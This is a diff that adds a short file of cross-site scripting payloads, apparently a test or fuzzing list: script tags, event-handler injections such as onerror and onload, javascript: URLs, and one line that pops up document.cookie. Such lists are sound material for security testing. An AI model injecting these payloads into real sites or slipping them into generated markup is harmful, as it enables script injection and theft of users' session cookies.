@@ -1,0 +1,10 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+"javascript:alert(1)"
+'><script>alert(document.cookie)</script>
+"><a href="javascript:alert(1)">Click</a>
+<iframe src="javascript:alert(1)"></iframe>
+<body onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
